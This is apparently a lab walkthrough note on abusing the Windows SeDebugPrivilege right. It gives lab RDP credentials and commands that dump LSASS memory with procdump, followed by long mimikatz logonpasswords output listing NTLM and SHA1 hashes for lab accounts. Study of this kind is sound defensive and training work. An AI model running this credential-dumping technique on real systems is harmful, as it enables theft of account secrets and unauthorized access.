To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under ==Computer Settings > Windows Settings > Security Settings==. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.

==A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound==

Scenario:RDP to with user "jordan" and password "HTB_@cademy_j0rdan!" and find NTLM hash for the sccm_svc account.

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp

run procdump.exe to dump hashes with the higher privlege

then use mimikatz 


C:\Tools\Mimikatz\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 2728303 (00000000:0029a16f)
Session           : Interactive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/30/2026 7:09:20 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 301057 (00000000:00049801)
Session           : Interactive from 1
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/30/2026 7:02:14 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 538730 (00000000:0008386a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/30/2026 7:03:15 AM
SID               : S-1-5-90-0-2
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 301379 (00000000:00049943)
Session           : Interactive from 1
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/30/2026 7:02:15 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        tspkg :
        wdigest :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:45 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 118908 (00000000:0001d07c)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS01
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:44 AM
SID               : S-1-5-80-3404462892-1987791245-2451609587-3755554482-3689831200
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : SQLTELEMETRY$SQLEXPRESS01
         * Domain   : NT Service
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WINLPE-SRV01$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:41 AM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : winlpe-srv01$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 560764 (00000000:00088e7c)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/30/2026 7:03:16 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 560734 (00000000:00088e5e)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/30/2026 7:03:16 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 73012 (00000000:00011d34)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:41 AM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:41 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 40429 (00000000:00009ded)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:40 AM
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 6500384 (00000000:00633020)
Session           : Interactive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 6/30/2026 7:42:52 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000006] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : 30689ae6de22596f45afb9619f8e5fa0
         * SHA1     : 369b6cc895433f5534f0a23b3025266ab515a581
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 114989 (00000000:0001c12d)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS01
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:44 AM
SID               : S-1-5-80-684135558-66954648-645343295-865517114-2956913369
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : MSSQL$SQLEXPRESS01
         * Domain   : NT Service
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 114926 (00000000:0001c0ee)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 6/30/2026 7:01:44 AM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : MSSQL$SQLEXPRESS
         * Domain   : NT Service
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 5260659 (00000000:00504573)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 6/30/2026 7:25:00 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 538704 (00000000:00083850)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/30/2026 7:03:15 AM
SID               : S-1-5-90-0-2
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
```